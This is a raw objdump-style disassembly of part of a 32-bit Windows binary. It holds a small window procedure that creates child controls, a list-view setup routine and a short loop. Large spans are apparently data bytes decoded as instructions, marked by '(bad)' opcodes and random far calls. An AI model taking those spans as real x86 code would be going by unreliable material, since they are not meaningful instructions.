  41d4f5:	stos   BYTE PTR es:[edi],al
  41d4f6:	orps   xmm4,xmm6
  41d4f9:	dec    eax
  41d4fa:	push   ebx
  41d4fb:	inc    eax
  41d4fc:	inc    ecx
  41d4fd:	inc    ebx
  41d4fe:	inc    eax
  41d4ff:	add    eax,0x43406262
  41d504:	inc    ecx
  41d505:	adc    BYTE PTR [eax],al
  41d507:	inc    eax
  41d508:	add    eax,0x43000562
  41d50d:	add    BYTE PTR [ecx+0x40],al
  41d510:	inc    eax
  41d511:	add    eax,0x400062
  41d516:	inc    ebx
  41d517:	inc    eax
  41d518:	js     0x41d55b
  41d51a:	inc    ecx
  41d51b:	bound  eax,QWORD PTR [eax-0x48]
  41d51e:	inc    eax
  41d51f:	inc    eax
  41d520:	shl    BYTE PTR [eax+ebx*4],0xc9
  41d524:	test   BYTE PTR [ebx+0x40],0x2d
  41d528:	and    DWORD PTR [ecx+eax*2],ebx
  41d52b:	test   al,0xa8
  41d52d:	addr16 dec eax
  41d52f:	dec    edx
  41d530:	jno    0x41d4ec
  41d532:	gs or  eax,0x40409004
  41d538:	(bad)
  41d53b:	retf   
  41d53c:	stos   BYTE PTR es:[edi],al
  41d53d:	bound  eax,QWORD PTR [eax+0x21]
  41d540:	bound  eax,QWORD PTR [eax+0x5]
  41d543:	inc    ecx
  41d544:	add    BYTE PTR [ebx+0x40],al
  41d547:	inc    eax
  41d548:	inc    ecx
  41d549:	inc    eax
  41d54a:	inc    eax
  41d54b:	bound  eax,QWORD PTR ds:0x5624300
  41d551:	add    BYTE PTR [eax+0x40],al
  41d554:	add    BYTE PTR [ecx+0x43],al
  41d557:	add    BYTE PTR [eax+0x41],al
  41d55a:	add    eax,0x40436200
  41d55f:	inc    eax
  41d560:	add    eax,0x98be2762
  41d565:	pop    esp
  41d566:	bound  eax,QWORD PTR [eax+0x40]
  41d569:	and    al,bl
  41d56b:	add    DWORD PTR ds:0x44206643,eax
  41d571:	and    ch,BYTE PTR [ebx]
  41d573:	adc    al,0xc9
  41d575:	ins    BYTE PTR es:[edi],dx
  41d576:	mov    ah,0xb5
  41d578:	inc    eax
  41d579:	inc    edx
  41d57a:	out    dx,al
  41d57b:	neg    DWORD PTR [esp+eax*4+0x34406262]
  41d582:	ret    0x54f
  41d585:	(bad)  
  41d586:	out    0x5,eax
  41d588:	and    al,0x1e
  41d58a:	aaa    
  41d58b:	dec    eax
  41d58c:	retf   
  41d58d:	mov    esp,0x42658728
  41d592:	inc    ecx
  41d593:	inc    eax
  41d594:	add    eax,0x41624340
  41d599:	test   BYTE PTR [eax],al
  41d59b:	and    eax,0x404043
  41d5a0:	add    BYTE PTR ds:0x626210,al
  41d5a6:	add    eax,0x43404140
  41d5ab:	inc    eax
  41d5ac:	inc    ecx
  41d5ad:	add    eax,0x10664062
  41d5b2:	inc    ebx
  41d5b3:	bound  eax,QWORD PTR [edx+0x3b21940d]
  41d5b9:	jne    0x41d61b
  41d5bb:	addr16 ret 
  41d5bd:	retf   
  41d5be:	adc    eax,0x7a92c811
  41d5c3:	inc    eax
  41d5c4:	cmc    
  41d5c5:	dec    esp
  41d5c6:	leave  
  41d5c7:	arpl   WORD PTR [edx+0x62],sp
  41d5ca:	sub    BYTE PTR [ebx],al
  41d5cc:	rol    DWORD PTR [esi-0x50],0x57
  41d5d0:	jae    0x41d55a
  41d5d2:	xor    al,0x5
  41d5d4:	int3   
  41d5d5:	inc    ecx
  41d5d6:	inc    eax
  41d5d7:	add    BYTE PTR [eax],al
  41d5d9:	add    BYTE PTR [eax+0x40],al
  41d5dc:	inc    ebx
  41d5dd:	bound  eax,QWORD PTR [eax]
  41d5df:	inc    eax
  41d5e0:	inc    eax
  41d5e1:	add    eax,0x62434162
  41d5e6:	inc    eax
  41d5e7:	js     0x41d5f9
  41d5e9:	inc    ecx
  41d5ea:	add    eax,0x5404325
  41d5ef:	bound  eax,QWORD PTR [eax+0x40]
  41d5f2:	inc    ecx
  41d5f3:	inc    ebx
  41d5f4:	inc    eax
  41d5f5:	inc    ebx
  41d5f6:	clc    
  41d5f7:	adc    eax,0x27677f34
  41d5fc:	dec    edx
  41d5fd:	rcl    BYTE PTR [ebx+ebp*2-0x63],0xf9
  41d602:	pushf  
  41d603:	cs loopne 0x41d62a
  41d606:	test   al,0xe4
  41d608:	xor    ah,BYTE PTR [edx+0x64]
  41d60b:	and    eax,0x15106b40
  41d610:	(bad)  
  41d611:	out    0x87,eax
  41d613:	or     al,0x4d
  41d615:	lds    esp,FWORD PTR [ebx-0x35]
  41d618:	pop    ebp
  41d619:	int3   
  41d61a:	inc    eax
  41d61b:	ins    DWORD PTR es:[edi],dx
  41d61c:	inc    eax
  41d61d:	neg    DWORD PTR [edi-0x1c]
  41d620:	xor    al,0xc2
  41d622:	and    BYTE PTR [esp+ebp*2],dh
  41d625:	ret    0xd52
  41d628:	dec    eax
  41d629:	test   al,0x52
  41d62b:	cs and eax,0x436241
  41d631:	adc    BYTE PTR [eax+0x0],al
  41d634:	add    eax,0x62410040
  41d639:	inc    eax
  41d63a:	add    BYTE PTR [ebx-0x34],al
  41d63d:	inc    eax
  41d63e:	add    eax,0x78434040
  41d643:	bound  eax,QWORD PTR [ecx+0x78]
  41d646:	add    eax,0x62404043
  41d64b:	cmp    bh,bl
  41d64d:	sbb    cl,cl
  41d64f:	add    eax,0x42256211
  41d654:	xor    eax,DWORD PTR [eax]
  41d656:	push   eax
  41d657:	jnp    0x41d615
  41d659:	add    eax,0x63012434
  41d65e:	or     BYTE PTR [ecx+eax*2-0x3ebfd179],bh
  41d665:	rol    BYTE PTR [ebx+0x43],1
  41d668:	popa   
  41d669:	inc    ecx
  41d66a:	inc    eax
  41d66b:	add    eax,0x43436240
  41d670:	add    eax,0x62004040
  41d675:	inc    eax
  41d676:	add    BYTE PTR [ecx+0x40],al
  41d679:	inc    ebx
  41d67a:	test   BYTE PTR ds:0x58054041,ah
  41d680:	inc    eax
  41d681:	inc    eax
  41d682:	bound  eax,QWORD PTR [eax+0x66]
  41d685:	inc    ecx
  41d686:	inc    eax
  41d687:	add    eax,0x322f1600
  41d68c:	add    bl,cl
  41d68e:	mov    BYTE PTR [ebp+0x48036018],dh
  41d694:	sar    BYTE PTR [edi+0x4164600d],0x40
  41d69b:	and    dh,BYTE PTR ds:0xe65345be
  41d6a1:	jge    0x41d6ed
  41d6a3:	inc    eax
  41d6a4:	retf   
  41d6a5:	lahf   
  41d6a6:	inc    eax
  41d6a7:	je     0x41d6d5
  41d6a9:	fmul   QWORD PTR [ebp+0x27]
  41d6ac:	(bad)  
  41d6ad:	aad    0x5
  41d6af:	test   eax,0x5625950b
  41d6b4:	add    BYTE PTR [eax],al
  41d6b6:	inc    ebx
  41d6b7:	inc    eax
  41d6b8:	bound  eax,QWORD PTR ds:0x25404110
  41d6be:	add    ah,cl
  41d6c0:	inc    ebx
  41d6c1:	add    eax,0x40402562
  41d6c6:	add    BYTE PTR [eax+0x40],al
  41d6c9:	inc    ecx
  41d6ca:	inc    ecx
  41d6cb:	add    eax,0x78434025
  41d6d0:	bound  eax,QWORD PTR [eax-0x7c]
  41d6d3:	inc    eax
  41d6d4:	inc    ecx
  41d6d5:	aaa    
  41d6d6:	inc    ebx
  41d6d7:	and    al,0xa8
  41d6d9:	xor    al,0x30
  41d6db:	xor    eax,DWORD PTR [edx+0x34]
  41d6de:	cmp    al,0x5b
  41d6e0:	adc    eax,0x602fbc65
  41d6e5:	retf   0x34a0
  41d6e8:	inc    ecx
  41d6e9:	es add eax,0x626c762c
  41d6ef:	pushf  
  41d6f0:	push   ecx
  41d6f1:	bound  eax,QWORD PTR [eax+0x23]
  41d6f4:	inc    eax
  41d6f5:	sub    cl,bl
  41d6f7:	adc    eax,0x60925b34
  41d6fc:	das    
  41d6fd:	inc    eax
  41d6fe:	addr16 jnp 0x41d753
  41d701:	and    al,0x6b
  41d703:	jp     0x41d745
  41d705:	and    DWORD PTR ds:0x4041cdb0,esi
  41d70b:	inc    eax
  41d70c:	inc    ebx
  41d70d:	int3   
  41d70e:	add    BYTE PTR ds:0x56240,al
  41d714:	inc    ebx
  41d715:	inc    eax
  41d716:	inc    eax
  41d717:	add    BYTE PTR [ecx+0x62],al
  41d71a:	bound  eax,QWORD PTR [eax]
  41d71c:	int3   
  41d71d:	inc    eax
  41d71e:	inc    ebx
  41d71f:	add    eax,0x43624041
  41d724:	adc    BYTE PTR [ecx+0x5],al
  41d727:	inc    eax
  41d728:	adc    BYTE PTR ds:0x2805602e,bh
  41d72e:	adc    eax,0x2f0cc454
  41d733:	call   0x650cf6fa
  41d738:	push   ebx
  41d739:	arpl   WORD PTR [ecx],bp
  41d73b:	ins    BYTE PTR es:[edi],dx
  41d73c:	and    al,0x1d
  41d73e:	cmp    BYTE PTR [ebp+0x1f],cl
  41d741:	aad    0x34
  41d743:	inc    eax
  41d744:	push   ss
  41d745:	bound  eax,QWORD PTR [ebx+0x40]
  41d748:	adc    BYTE PTR ds:0x4158cc40,al
  41d74e:	inc    ebx
  41d74f:	bound  eax,QWORD PTR [ecx+0x40]
  41d752:	add    eax,0x4140
  41d757:	and    eax,0x40400062
  41d75c:	add    eax,0x84404340
  41d761:	int3   
  41d762:	js     0x41d764
  41d764:	inc    ecx
  41d765:	adc    BYTE PTR [edx+0xf],ah
  41d768:	xor    ax,0xa8c8
  41d76c:	test   al,0x23
  41d76e:	xor    al,cl
  41d770:	inc    ebx
  41d771:	inc    esp
  41d772:	jmp    0xc850:0xe4251211
  41d779:	mov    eax,0x2e4844e9
  41d77e:	inc    eax
  41d77f:	ret    
  41d780:	outs   dx,BYTE PTR ds:[esi]
  41d781:	cmp    eax,0x2e4141a8
  41d786:	sub    al,0x6f
  41d788:	pop    esi
  41d789:	ret    
  41d78a:	adc    BYTE PTR [esi],cl
  41d78c:	data16 das 
  41d78e:	test   cl,al
  41d790:	pop    esp
  41d791:	ds inc ecx
  41d793:	add    BYTE PTR [ebx+eax*1],0x41
  41d797:	dec    ebx
  41d798:	into   
  41d799:	xor    al,0xb6
  41d79b:	add    BYTE PTR [eax+0x41],al
  41d79e:	inc    eax
  41d79f:	inc    ebx
  41d7a0:	bound  ax,DWORD PTR ds:0x40434100
  41d7a7:	add    eax,0x40054062
  41d7ac:	bound  eax,QWORD PTR [ecx+0x40]
  41d7af:	inc    ebx
  41d7b0:	inc    eax
  41d7b1:	add    eax,0x25405841
  41d7b6:	bound  eax,QWORD PTR [eax+0x43]
  41d7b9:	inc    eax
  41d7ba:	adc    BYTE PTR [edx+0x65],ah
  41d7bd:	inc    eax
  41d7be:	sub    al,0xc0
  41d7c0:	push   ebx
  41d7c1:	dec    ebp
  41d7c2:	jo     0x41d82a
  41d7c4:	inc    eax
  41d7c5:	inc    eax
  41d7c6:	inc    ecx
  41d7c7:	outs   dx,DWORD PTR ds:[esi]
  41d7c8:	int    0x40
  41d7ca:	push   edx
  41d7cb:	and    al,0x20
  41d7cd:	inc    eax
  41d7ce:	fs sub al,0x41
  41d7d1:	mov    WORD PTR [esp+eiz*2],?
  41d7d4:	inc    eax
  41d7d5:	inc    ecx
  41d7d6:	inc    ebx
  41d7d7:	inc    eax
  41d7d8:	add    eax,0x43406262
  41d7dd:	inc    ecx
  41d7de:	adc    BYTE PTR [eax],al
  41d7e0:	inc    eax
  41d7e1:	add    eax,0x43000562
  41d7e6:	add    BYTE PTR [ecx+0x40],al
  41d7e9:	inc    eax
  41d7ea:	add    eax,0x400062
  41d7ef:	inc    ebx
  41d7f0:	inc    eax
  41d7f1:	js     0x41d834
  41d7f3:	inc    ecx
  41d7f4:	bound  eax,QWORD PTR [eax+0x6f]
  41d7f7:	inc    eax
  41d7f8:	inc    eax
  41d7f9:	jp     0x41d7f0
  41d7fb:	imul   ecx,DWORD PTR [eax+0x4],0x1
  41d7ff:	dec    edx
  41d800:	ins    BYTE PTR es:[edi],dx
  41d801:	ror    DWORD PTR [ebx],0x62
  41d804:	adc    eax,0xee4da848
  41d809:	jno    0x41d7b3
  41d80b:	test   al,0xc8
  41d80d:	push   0xc1402541
  41d812:	cs in  eax,dx
  41d814:	scas   eax,DWORD PTR es:[edi]
  41d815:	outs   dx,BYTE PTR ds:[esi]
  41d816:	sub    dh,BYTE PTR [esi]
  41d818:	cmp    BYTE PTR [ebx-0x36],ch
  41d81b:	fisub  WORD PTR [edx-0x4c]
  41d81e:	adc    DWORD PTR [ecx],ebp
  41d820:	bound  eax,QWORD PTR [eax+0x5]
  41d823:	inc    ecx
  41d824:	add    BYTE PTR [ebx+0x40],al
  41d827:	inc    eax
  41d828:	inc    ecx
  41d829:	inc    eax
  41d82a:	inc    eax
  41d82b:	bound  eax,QWORD PTR ds:0x5624300
  41d831:	add    BYTE PTR [eax+0x40],al
  41d834:	add    BYTE PTR [ecx+0x43],al
  41d837:	add    BYTE PTR [eax+0x41],al
  41d83a:	add    eax,0x40436200
  41d83f:	inc    eax
  41d840:	add    eax,0x62c24062
  41d845:	mov    BYTE PTR [ebp+0x352c4862],ah
  41d84b:	and    DWORD PTR [eax+0xd707415],esi
  41d851:	add    DWORD PTR [eax+0x37],eax
  41d854:	dec    eax
  41d855:	int    0x62
  41d857:	mov    esp,0xc2256d44
  41d85c:	in     eax,dx
  41d85d:	inc    esp
  41d85e:	inc    ebx
  41d85f:	arpl   WORD PTR [ebx+0x30],sp
  41d862:	fs pusha 
  41d864:	xor    ch,BYTE PTR [edx]
  41d866:	cmp    BYTE PTR [eax],al
  41d868:	mov    WORD PTR ds:0x42193640,fs
  41d86e:	lahf   
  41d86f:	jb     0x41d8d8
  41d871:	and    eax,0x473bc023
  41d876:	inc    ecx
  41d877:	inc    eax
  41d878:	add    eax,0x41624340
  41d87d:	test   BYTE PTR [eax],al
  41d87f:	and    eax,0x404043
  41d884:	add    BYTE PTR ds:0x626210,al
  41d88a:	add    eax,0x43404140
  41d88f:	inc    eax
  41d890:	inc    ecx
  41d891:	add    eax,0x10664062
  41d896:	inc    ebx
  41d897:	bound  ebp,QWORD PTR [eax+0x420b6101]
  41d89d:	xor    eax,0x6710ecfe
  41d8a2:	ins    BYTE PTR es:[edi],dx
  41d8a3:	pusha  
  41d8a4:	inc    eax
  41d8a5:	das    
  41d8a6:	(bad)  
  41d8a7:	in     eax,dx
  41d8a8:	push   esp
  41d8a9:	add    ah,BYTE PTR [edx+0x7a]
  41d8ac:	and    eax,0x5ac7b68
  41d8b1:	mov    ah,0x49
  41d8b3:	add    eax,0x4041cc
  41d8b8:	add    BYTE PTR [eax],al
  41d8ba:	inc    eax
  41d8bb:	inc    eax
  41d8bc:	inc    ebx
  41d8bd:	bound  eax,QWORD PTR [eax]
  41d8bf:	inc    eax
  41d8c0:	inc    eax
  41d8c1:	add    eax,0x62434162
  41d8c6:	inc    eax
  41d8c7:	js     0x41d8d9
  41d8c9:	inc    ecx
  41d8ca:	add    eax,0x5404325
  41d8cf:	bound  eax,QWORD PTR [eax+0x40]
  41d8d2:	inc    ecx
  41d8d3:	inc    ebx
  41d8d4:	cs enter 0x24c0,0x62
  41d8d9:	inc    ebx
  41d8da:	bound  esp,QWORD PTR [eax]
  41d8dc:	das    
  41d8dd:	inc    edx
  41d8de:	pusha  
  41d8df:	fcmovb st,st(5)
  41d8e1:	inc    ebx
  41d8e2:	push   es
  41d8e3:	mov    esi,0x12026029
  41d8e8:	dec    edi
  41d8e9:	mov    al,0x50
  41d8eb:	sbb    dh,BYTE PTR [eax+edi*1]
  41d8ee:	shl    BYTE PTR [ecx],0x4c
  41d8f1:	in     al,dx
  41d8f2:	bound  ebp,QWORD PTR [eax+0x2f094023]
  41d8f8:	add    cl,BYTE PTR [ebp+0x7c]
  41d8fb:	inc    edx
  41d8fc:	and    eax,0x7bdc4b25
  41d901:	mov    WORD PTR [edx+ebp*1+0x2e],?
  41d905:	dec    eax
  41d906:	into   
  41d907:	imul   esp,DWORD PTR ds:0x436241,0x10
  41d90e:	inc    eax
  41d90f:	add    BYTE PTR ds:0x62410040,al
  41d915:	inc    eax
  41d916:	add    BYTE PTR [ebx-0x34],al
  41d919:	inc    eax
  41d91a:	add    eax,0x78434040
  41d91f:	bound  eax,QWORD PTR [ecx+0x78]
  41d922:	add    eax,0x62404043
  41d927:	inc    edx
  41d928:	xchg   esi,eax
  41d929:	gs inc edx
  41d92b:	cs inc eax
  41d92d:	jle    0x41d98e
  41d92f:	lock mov BYTE PTR [eax],bh
  41d932:	fs das 
  41d934:	sub    al,0x40
  41d936:	cmp    ah,ch
  41d938:	push   edx
  41d939:	adc    al,0xc
  41d93b:	add    eax,DWORD PTR [ecx+0x40]
  41d93e:	add    eax,0x43436240
  41d943:	add    eax,0x62004040
  41d948:	inc    eax
  41d949:	add    BYTE PTR [ecx+0x40],al
  41d94c:	inc    ebx
  41d94d:	test   BYTE PTR ds:0x58054041,ah
  41d953:	inc    eax
  41d954:	inc    eax
  41d955:	bound  eax,QWORD PTR [eax+0x66]
  41d958:	inc    ecx
  41d959:	inc    eax
  41d95a:	add    eax,0x16146a00
  41d95f:	bound  esp,QWORD PTR [ecx+0x63]
  41d962:	bound  eax,QWORD PTR [eax+0x40]
  41d965:	xor    bl,BYTE PTR [ebp+eiz*2+0x40646594]
  41d96c:	sub    DWORD PTR [ebx+0x7d],edx
  41d96f:	int3   
  41d970:	sbb    eax,0x70403ce0
  41d975:	add    BYTE PTR [eax],al
  41d977:	inc    ebx
  41d978:	inc    eax
  41d979:	bound  eax,QWORD PTR ds:0x25404110
  41d97f:	add    ah,cl
  41d981:	inc    ebx
  41d982:	add    eax,0x40402562
  41d987:	add    BYTE PTR [eax+0x40],al
  41d98a:	inc    ecx
  41d98b:	inc    ecx
  41d98c:	add    eax,0x78434025
  41d991:	bound  eax,QWORD PTR [eax-0x7c]
  41d994:	inc    eax
  41d995:	inc    ecx
  41d996:	shl    BYTE PTR [edx-0x12],0xbe
  41d99a:	arpl   WORD PTR [esi+0x4a],sp
  41d99d:	inc    eax
  41d99e:	jl     0x41d9b2
  41d9a0:	push   0x4d87ea96
  41d9a5:	ss inc ecx
  41d9a7:	enter  0xcc09,0xcc
  41d9ab:	int3   
  41d9ac:	int3   
  41d9ad:	int3   
  41d9ae:	int3   
  41d9af:	int3   
  41d9b0:	push   ebp
  41d9b1:	mov    ebp,esp
  41d9b3:	sub    esp,0x90
  41d9b9:	mov    eax,DWORD PTR [ebp+0xc]
  41d9bc:	mov    DWORD PTR [ebp-0x8c],eax
  41d9c2:	cmp    DWORD PTR [ebp-0x8c],0x1
  41d9c9:	je     0x41d9ed
  41d9cb:	cmp    DWORD PTR [ebp-0x8c],0x2
  41d9d2:	je     0x41dae0
  41d9d8:	cmp    DWORD PTR [ebp-0x8c],0x111
  41d9e2:	je     0x41da93
  41d9e8:	jmp    0x41daee
  41d9ed:	push   0x0
  41d9ef:	mov    ecx,DWORD PTR ds:0x431da4
  41d9f5:	push   ecx
  41d9f6:	push   0x0
  41d9f8:	mov    edx,DWORD PTR [ebp+0x8]
  41d9fb:	push   edx
  41d9fc:	push   0x18
  41d9fe:	push   0x8c
  41da03:	push   0x28
  41da05:	push   0x64
  41da07:	push   0x40000000
  41da0c:	push   0x429dd8
  41da11:	push   0x429ddc
  41da16:	push   0x0
  41da18:	call   DWORD PTR ds:0x429114
  41da1e:	mov    ds:0x431da0,eax
  41da23:	push   0x0
  41da25:	mov    eax,ds:0x431da4
  41da2a:	push   eax
  41da2b:	push   0x0
  41da2d:	mov    ecx,DWORD PTR [ebp+0x8]
  41da30:	push   ecx
  41da31:	push   0x18
  41da33:	push   0x8c
  41da38:	push   0x65
  41da3a:	push   0x69
  41da3c:	push   0x40000000
  41da41:	push   0x429de4
  41da46:	push   0x429dec
  41da4b:	push   0x0
  41da4d:	call   DWORD PTR ds:0x429114
  41da53:	mov    ds:0x431da8,eax
  41da58:	mov    edx,DWORD PTR [ebp+0x8]
  41da5b:	push   edx
  41da5c:	call   0x41db30
  41da61:	add    esp,0x4
  41da64:	mov    DWORD PTR [ebp-0x7c],0x2
  41da6b:	lea    eax,[ebp-0x7c]
  41da6e:	push   eax
  41da6f:	push   0x2
  41da71:	push   0x1019
  41da76:	mov    ecx,DWORD PTR ds:0x431d98
  41da7c:	push   ecx
  41da7d:	call   DWORD PTR ds:0x429104
  41da83:	mov    edx,DWORD PTR [ebp-0x74]
  41da86:	mov    DWORD PTR ds:0x431d9c,edx
  41da8c:	or     eax,0xffffffff
  41da8f:	jmp    0x41db04
  41da91:	jmp    0x41db04
  41da93:	mov    eax,DWORD PTR [ebp+0x10]
  41da96:	and    eax,0xffff
  41da9b:	movzx  ecx,ax
  41da9e:	mov    DWORD PTR [ebp-0x80],ecx
  41daa1:	mov    edx,DWORD PTR [ebp+0x10]
  41daa4:	shr    edx,0x10
  41daa7:	and    edx,0xffff
  41daad:	movzx  eax,dx
  41dab0:	mov    DWORD PTR [ebp-0x84],eax
  41dab6:	mov    ecx,DWORD PTR [ebp-0x80]
  41dab9:	mov    DWORD PTR [ebp-0x90],ecx
  41dabf:	cmp    DWORD PTR [ebp-0x90],0x69
  41dac6:	je     0x41daca
  41dac8:	jmp    0x41dad6
  41daca:	mov    edx,DWORD PTR [ebp+0x8]
  41dacd:	push   edx
  41dace:	call   DWORD PTR ds:0x429108
  41dad4:	jmp    0x41dada
  41dad6:	jmp    0x41daee
  41dad8:	jmp    0x41daee
  41dada:	xor    eax,eax
  41dadc:	jmp    0x41db04
  41dade:	jmp    0x41db04
  41dae0:	push   0x0
  41dae2:	call   DWORD PTR ds:0x42910c
  41dae8:	xor    eax,eax
  41daea:	jmp    0x41db04
  41daec:	jmp    0x41db04
  41daee:	mov    eax,DWORD PTR [ebp+0x14]
  41daf1:	push   eax
  41daf2:	mov    ecx,DWORD PTR [ebp+0x10]
  41daf5:	push   ecx
  41daf6:	mov    edx,DWORD PTR [ebp+0xc]
  41daf9:	push   edx
  41dafa:	mov    eax,DWORD PTR [ebp+0x8]
  41dafd:	push   eax
  41dafe:	call   DWORD PTR ds:0x429110
  41db04:	mov    esp,ebp
  41db06:	pop    ebp
  41db07:	ret    0x10
  41db0a:	int3   
  41db0b:	int3   
  41db0c:	int3   
  41db0d:	int3   
  41db0e:	int3   
  41db0f:	int3   
  41db10:	push   esi
  41db11:	push   edi
  41db12:	push   ebx
  41db13:	push   eax
  41db14:	pop    ebx
  41db15:	mov    edx,ebx
  41db17:	push   ecx
  41db18:	call   0x403670
  41db1d:	pop    ecx
  41db1e:	loop   0x41db17
  41db20:	pop    ebx
  41db21:	pop    edi
  41db22:	pop    esi
  41db23:	xor    eax,eax
  41db25:	ret    
  41db26:	int3   
  41db27:	int3   
  41db28:	int3   
  41db29:	int3   
  41db2a:	int3   
  41db2b:	int3   
  41db2c:	int3   
  41db2d:	int3   
  41db2e:	int3   
  41db2f:	int3   
  41db30:	push   ebp
  41db31:	mov    ebp,esp
  41db33:	sub    esp,0x30
  41db36:	push   0x0
  41db38:	mov    eax,ds:0x431da4
  41db3d:	push   eax
  41db3e:	push   0x0
  41db40:	mov    ecx,DWORD PTR [ebp+0x8]
  41db43:	push   ecx
  41db44:	push   0x18
  41db46:	push   0x8c
  41db4b:	push   0x65
  41db4d:	push   0x69
  41db4f:	push   0x40000000
  41db54:	push   0x429df4
  41db59:	push   0x429df8
  41db5e:	push   0x0
  41db60:	call   DWORD PTR ds:0x429114
  41db66:	mov    ds:0x431da8,eax
  41db6b:	push   0x0
  41db6d:	mov    edx,DWORD PTR ds:0x431da4
  41db73:	push   edx
  41db74:	push   0x0
  41db76:	mov    eax,DWORD PTR [ebp+0x8]
  41db79:	push   eax
  41db7a:	push   0x17e
  41db7f:	push   0x8c
  41db84:	push   0xac
  41db89:	push   0x74
  41db8b:	push   0x1
  41db8d:	push   0x429e00
  41db92:	push   0x429e08
  41db97:	push   0x10200
  41db9c:	call   DWORD PTR ds:0x429114
  41dba2:	mov    ds:0x431d98,eax
  41dba7:	mov    DWORD PTR [ebp-0x30],0x6
  41dbae:	mov    DWORD PTR [ebp-0x24],0x429e18
  41dbb5:	mov    ecx,DWORD PTR ds:0x431dac
  41dbbb:	sub    ecx,0x70c
  41dbc1:	mov    DWORD PTR [ebp-0x28],ecx
  41dbc4:	mov    DWORD PTR [ebp-0x4],0x0
  41dbcb:	jmp    0x41dbd6
  41dbcd:	mov    edx,DWORD PTR [ebp-0x4]
  41dbd0:	add    edx,0x1
  41dbd3:	mov    DWORD PTR [ebp-0x4],edx
  41dbd6:	cmp    DWORD PTR [ebp-0x4],0x9
  41dbda:	jge    0x41dc00
  41dbdc:	mov    eax,DWORD PTR [ebp-0x28]
  41dbdf:	sub    eax,0x1
  41dbe2:	mov    DWORD PTR [ebp-0x28],eax
  41dbe5:	lea    ecx,[ebp-0x30]
  41dbe8:	push   ecx
  41dbe9:	mov    edx,DWORD PTR [ebp-0x4]
  41dbec:	push   edx
  41dbed:	push   0x101b
  41dbf2:	mov    eax,ds:0x431d98
  41dbf7:	push   eax
  41dbf8:	call   DWORD PTR ds:0x429104
  41dbfe:	jmp    0x41dbcd
  41dc00:	mov    esp,ebp
  41dc02:	pop    ebp
  41dc03:	ret    
  41dc04:	int3   
  41dc05:	int3   
  41dc06:	int3   
  41dc07:	int3   
  41dc08:	int3   
  41dc09:	int3   
  41dc0a:	int3   
  41dc0b:	int3   
  41dc0c:	int3   
  41dc0d:	int3   
  41dc0e:	int3   
  41dc0f:	int3   
  41dc10:	jns    0x41dc7e
  41dc12:	(bad)  
  41dc13:	fsub   DWORD PTR [eax]
  41dc15:	or     al,0x6a
  41dc17:	cmp    ch,al
  41dc19:	xchg   ebx,eax
  41dc1a:	in     eax,0x4a
  41dc1c:	mov    DWORD PTR [esi],0x8561a4a
  41dc22:	call   0x20d8:0xd66c79ef
  41dc29:	sub    al,0xe7
  41dc2b:	cmp    bl,BYTE PTR [ebx-0x34]
  41dc2e:	cmp    al,0x3c
  41dc30:	ins    DWORD PTR es:[edi],dx
  41dc31:	mov    eax,0xc74ae57b
  41dc36:	push   es
  41dc37:	adc    DWORD PTR [ecx-0x7f8ef16b],ebx
  41dc3d:	xor    eax,0x6cbcb703
  41dc42:	or     BYTE PTR gs:[eax-0x77],cl
  41dc46:	loope  0x41dbe4
  41dc48:	or     eax,edi
  41dc4a:	inc    ecx
  41dc4b:	das    
  41dc4c:	outs   dx,BYTE PTR ds:[esi]
  41dc4d:	push   es
  41dc4e:	jp     0x41dc45
  41dc50:	mov    WORD PTR [eax],?
  41dc52:	or     BYTE PTR [edx+0x197f45aa],dh
  41dc58:	cmp    ch,cl
  41dc5a:	clc    
  41dc5b:	cmp    BYTE PTR [eax],0xa9
  41dc5e:	arpl   WORD PTR [esi],sp
  41dc60:	sub    DWORD PTR [esi+eiz*1-0x2],esp
  41dc64:	adc    DWORD PTR ds:0x52b1806c,0x78
  41dc6b:	pop    ds
  41dc6c:	pop    ebx
  41dc6d:	test   dl,dl
  41dc6f:	mov    DWORD PTR [esi],esp
  41dc71:	test   al,0x65
  41dc73:	dec    edx
  41dc74:	dec    esp
  41dc75:	aas    
  41dc76:	jp     0x41dc66
  41dc78:	call   0x784f:0xaa860018
  41dc7f:	mulps  xmm3,XMMWORD PTR [ebx+edx*4+0x72b523b3]
  41dc87:	aas    
  41dc88:	jnp    0x41dcc4
  41dc8a:	dec    esi
  41dc8b:	call   0x83adf91a
  41dc90:	mov    dh,0x4d
  41dc92:	ins    DWORD PTR es:[edi],dx
  41dc93:	sbb    ch,BYTE PTR [ecx+eax*4-0xa]
  41dc97:	xchg   edx,eax
  41dc98:	add    eax,0x762340a1
  41dc9d:	xor    ecx,DWORD PTR [eax]
  41dc9f:	fist   WORD PTR [edi-0x5579e7f0]
  41dca5:	dec    edi
  41dca6:	outs   dx,DWORD PTR ds:[esi]
  41dca7:	cmovns ebx,DWORD PTR [ebx+0x2bc1e793]
  41dcae:	test   DWORD PTR [esi+0x6e55dfea],ecx
  41dcb4:	fs sub al,0x68
  41dcb7:	pop    ebp
  41dcb8:	call   0x1af2:0x4eaa892c
  41dcbf:	mov    al,ds:0x424c4cb2
  41dcc4:	xchg   ebx,eax
  41dcc5:	sbb    esi,esp
  41dcc7:	and    ebp,ebp
  41dcc9:	jns    0x41dd37
  41dccb:	(bad)  
  41dccc:	push   edx
  41dccd:	and    ecx,DWORD PTR [edi-0x11]
  41dcd0:	cli    
  41dcd1:	popf   
  41dcd2:	push   0xffffffac
  41dcd4:	aas    
  41dcd5:	xor    ebp,ebp
  41dcd7:	fs dec eax
  41dcd9:	add    eax,0x29ffd883
  41dcde:	out    0x94,eax
  41dce0:	rcr    bh,1
  41dce2:	fdiv   QWORD PTR [eax]
  41dce4:	mov    bl,0xad
  41dce6:	outs   dx,DWORD PTR ds:[esi]
  41dce7:	(bad)  
  41dce8:	mov    cl,BYTE PTR [ebp+0x5]
  41dceb:	or     DWORD PTR [edi-0x439c826a],ebx
  41dcf1:	repnz cs (bad) 
  41dcf4:	mov    BYTE PTR [ebx+0x38c5624e],ch
  41dcfa:	sbb    ah,BYTE PTR [eax-0x3f390b4e]
  41dd00:	sbb    DWORD PTR ds:0x8e9a5a8d,edx
  41dd06:	out    0xd5,al
  41dd08:	es call 0x21064186
  41dd0e:	out    0xf1,eax
  41dd10:	sbb    DWORD PTR [eax],edi
  41dd12:	jae    0x41dcce
  41dd14:	in     eax,0x3
  41dd16:	lock retf 0x9a04
  41dd1a:	das    
  41dd1b:	test   DWORD PTR [edi],esp
  41dd1d:	jne    0x41dd0f
  41dd1f:	jecxz  0x41dda0
  41dd21:	sbb    BYTE PTR [eax+0x3c],bh
  41dd24:	rcl    DWORD PTR [edx+0x5613f302],0x8
  41dd2b:	call   0x629a:0x943c7b64
  41dd32:	dec    esi
